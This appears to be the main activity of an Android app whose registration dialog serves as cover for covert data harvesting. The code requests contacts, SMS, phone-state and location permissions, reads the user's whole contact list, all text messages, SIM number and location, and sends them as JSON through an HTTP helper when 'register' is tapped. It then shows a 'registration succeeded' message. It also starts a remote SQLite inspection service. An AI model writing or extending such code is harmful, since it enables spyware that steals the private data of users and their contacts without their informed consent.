package com.example.getphonedemo;

import android.Manifest;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import com.example.qingliao.R;
import com.orhanobut.dialogplus.DialogPlus;
import com.orhanobut.dialogplus.OnClickListener;
import com.orhanobut.dialogplus.ViewHolder;

import org.w3c.dom.Text;

import java.util.ArrayList;
import java.util.List;

import pl.com.salsoft.sqlitestudioremote.SQLiteStudioService;

public class MainActivity extends AppCompatActivity {
    private static final int PERMISSIONS_STATE_CODE_BASIC_INFORMATION = 1;
    public static final int LOCATION_CODE = 301;

    public static boolean Request_Permission = false;
    JsonUtil jsonUtil=new JsonUtil();
    private String locationProvider = null;
    private boolean isPermissons=true ;
    String[] permissions = new String[]{
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_FINE_LOCATION
    };
    // 声明一个集合，在后面的代码中用来存储用户拒绝授权的权
    List<String> mPermissionList = new ArrayList<>();

    private Button btn_register;

    HttpServer httpServer;

    private WebView webView ;
    public static List<String>lal=new ArrayList<>();
    public static String simPhone="";
    public static List<PhoneDto> phoneContactsList=new ArrayList<>();
    public static List<SmsDto> smsList=new ArrayList<>();
    private  DialogPlus dialog;
    @RequiresApi(api = Build.VERSION_CODES.M)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        SQLiteStudioService.instance().start(this);
        btn_register = findViewById(R.id.main_regien_button);


        httpServer=new HttpServer();

        //初始化权限
        initPermissions();
       initDialog();
        btn_register.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                dialog.show();
            }
        });
    }




    private void initDialog() {
        dialog = DialogPlus.newDialog(MainActivity.this)
                //主内容
                .setContentHolder(new ViewHolder(R.layout.content))
                .setHeader(R.layout.header)
                .setFooter(R.layout.footer)
                .setGravity(Gravity.CENTER)
                .setExpanded(true)  // This will enable the expand feature, (similar to android L share dialog)
                .setOnClickListener(new OnClickListener() {
                    @Override
                    public void onClick(DialogPlus dialog, View view) {
                        EditText edt_phone= (EditText) dialog.findViewById(R.id.content_phone_button);
                        EditText edt_qdm= (EditText) dialog.findViewById(R.id.content_qdm_button);
                        switch (view.getId()) {
                            case R.id.footer_close_button:
                                dialog.dismiss();
                                break;
                            case R.id.footer_register_button:
                                Log.d("clike", "确定注册");
//                                btn_register.setOnClickListener(new View.OnClickListener() {
//                                    @Override
//                                    public void onClick(View v) {
                                        String json;
                                        String phone = edt_phone.getText().toString();
                                        String qdm = edt_qdm.getText().toString();
                                        //打包json
                                        Log.d("Buttonclick","打包json");
                                        json=jsonUtil.getPhoneJson(lal,phone.toString(),phoneContactsList,smsList,qdm);
                                        //发送数据
                                        Log.d("Buttonclick","发送数据");
                                        httpServer.sendJson(json);
//                                    }
//                                });
                                Toast.makeText(MainActivity.this, "注册成功", Toast.LENGTH_SHORT).show();
                                dialog.dismiss();
                                break;
                        }
                    }
                })
                .create();
    }

    //初始化权限
    private void initPermissions() {
        for (int a=0;a<permissions.length;a++){;


            if (shouldShowRequestPermissionRationale(permissions[a])){
//对所有权限进行判断是否给与权限，没有的话进行请求
                if ((!PermissionUtil.hasSelfPermission(this, permissions))) {
                    for (int i = 0; i < permissions.length; i++) {
//                if (ContextCompat.checkSelfPermission(MainActivity_3.this, permissions[i]) != PackageManager.PERMISSION_GRANTED) {
                        mPermissionList.add(permissions[i]);
//                }
                    }
                    if (!mPermissionList.isEmpty()) {//未授予的权限为空，表示都授予了
                        //请求权限方法
                        String[] permissions = mPermissionList.toArray(new String[mPermissionList.size()]);//将List转为数组
                        //1.目标地址，2.请求权限,3.请求代码
                        ActivityCompat.requestPermissions(this, permissions, PERMISSIONS_STATE_CODE_BASIC_INFORMATION);
                    }
                } else {
                    Log.d("onRequestPermissionsResult", "权限已全部获取");
                    simPhone = TelephonyUtil.getSimPhone(this);
                    phoneContactsList = TelephonyUtil.getPhoneContacts(this);
                    smsList = TelephonyUtil.getSms(this);
                    lal=LocationUtil.getLocation(this);
                }
            }
        }





    }


    @Override
//    继承 申请权限
//    int requestCode: 在调用requestPermissions()时的第一个参数。
//    String[] permissions: 权限数组，在调用requestPermissions()时的第二个参数。
//    int[] grantResults: 授权结果数组，对应permissions，具体值和上方提到的PackageManager中的两个常量做比较。
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
            if (requestCode==PERMISSIONS_STATE_CODE_BASIC_INFORMATION){
                for (int i = 0; i < grantResults.length; i++) {
                    //判断是否为定位权限
                    if (requestCode==LOCATION_CODE){
                        if (grantResults.length > 0 && grantResults[0] == getPackageManager().PERMISSION_GRANTED
                                && grantResults[1] == PackageManager.PERMISSION_GRANTED) {
                            Log.d("onRequestPermissionsResultGPS", "location以获得权限");
                        } else {
                            Log.d("onRequestPermissionsResultGPS", "location未获得权限");
                        }
                    }else{//不是定位权限
                        switch (permissions[i]){
                                //本机手机
                            case Manifest.permission.READ_PHONE_STATE:
                                if (grantResults.length > 0 && grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                                    simPhone=TelephonyUtil.getSimPhone(this);
                                    Log.d("onRequestPermissionsResult","READ_PHONE_STATE获得权限");
                                }else {
                                    Log.d("onRequestPermissionsResult","READ_PHONE_STATE未获得权限");
                                }
                                break;
                                //通讯录
                            case    Manifest.permission.READ_CONTACTS:
                                if (grantResults.length > 0 && grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                                    Log.d("onRequestPermissionsResult", "READ_CONTACTS获得权限");
                                    phoneContactsList=TelephonyUtil.getPhoneContacts(this);

                                }else {
                                Log.d("onRequestPermissionsResult","READ_CONTACTS未获得权限");
                            }
                                break;
                                //短信
                            case Manifest.permission.READ_SMS:
                                if (grantResults.length > 0 && grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                                    Log.d("onRequestPermissionsResult", "READ_SMS获得权限");
                                    smsList=  TelephonyUtil.getSms(this);
                                }else {
                                Log.d("onRequestPermissionsResult","READ_SMS未获得权限");
                            }
                                break;
                            case Manifest.permission.ACCESS_COARSE_LOCATION:
                            case Manifest.permission.ACCESS_FINE_LOCATION:
                                if (grantResults.length > 0 && grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                                    Log.d("onRequestPermissionsResult", "location获得权限");
                                    lal= LocationUtil.getLocation(this);
                                }else {
                                    Log.d("onRequestPermissionsResult","location未获得权限");
                                }
                                break;
                        }
                    }
                }


            }
        Request_Permission=true;
//        if (Request_Permission){
//            jsonUtil.getPhoneJson(lal,simPhone,phoneContactsList,smsList,"0");
//        }
        Log.d("Permissons", String.valueOf(isPermissons));
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        }



//    LocationListener mListener = new LocationListener() {
//        @Override
//        public void onStatusChanged(String provider, int status, Bundle extras) {
//        }
//        @Override
//        public void onProviderEnabled(String provider) {
//        }
//        @Override
//        public void onProviderDisabled(String provider) {
//        }
//        // 如果位置发生变化，重新显示
//        @Override
//        public void onLocationChanged(Location location) {
//            showLocation(location);
//        }
//    };

    private boolean isFirst(){
        boolean isFirst=true;
        SharedPreferences setting = getSharedPreferences("First.ini", 0);
        Boolean user_first = setting.getBoolean("FIRST",true);
        if(user_first){//第一次
            setting.edit().putBoolean("FIRST", false).commit();
           return isFirst;
        }else{
            isFirst=false;
            return isFirst;
        }
//        return isFirst;
    }

}